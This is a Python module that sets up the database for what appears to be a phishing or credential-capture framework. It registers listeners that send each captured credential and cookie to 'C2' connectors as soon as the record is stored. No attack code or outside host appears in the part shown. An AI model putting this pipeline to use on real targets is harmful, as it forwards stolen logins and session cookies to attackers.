from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import event

# Central SQLAlchemy instance shared by the app and all models.
db = SQLAlchemy()

# Stored app reference for background tasks (e.g. webhook dispatch).
_app = None


def init_app(app):
    """Bind the shared db to the Flask app and create tables."""
    global _app
    _app = app
    # Import models here so they register with the shared db instance.
    from . import models  # noqa: F401
    from .models import Event, CapturedCredential, CapturedCookie
    db.init_app(app)
    with app.app_context():
        db.create_all()
    _register_webhook_listener(Event)
    _register_c2_listeners(CapturedCredential, CapturedCookie)


def _register_webhook_listener(Event):
    """Fire webhooks asynchronously when Event rows are inserted."""

    @event.listens_for(Event, 'after_insert')
    def _on_event_insert(mapper, connection, event_obj):
        from .utils.webhooks import dispatch_event
        if _app is not None:
            dispatch_event(event_obj, _app)


def _register_c2_listeners(CapturedCredential, CapturedCookie):
    """Fire C2 connectors asynchronously when captures are inserted."""

    @event.listens_for(CapturedCredential, 'after_insert')
    def _on_credential_insert(mapper, connection, credential):
        from .c2 import dispatch_credential
        if _app is not None:
            dispatch_credential(credential, _app)

    @event.listens_for(CapturedCookie, 'after_insert')
    def _on_cookie_insert(mapper, connection, cookie):
        from .c2 import dispatch_cookie
        if _app is not None:
            dispatch_cookie(cookie, _app)
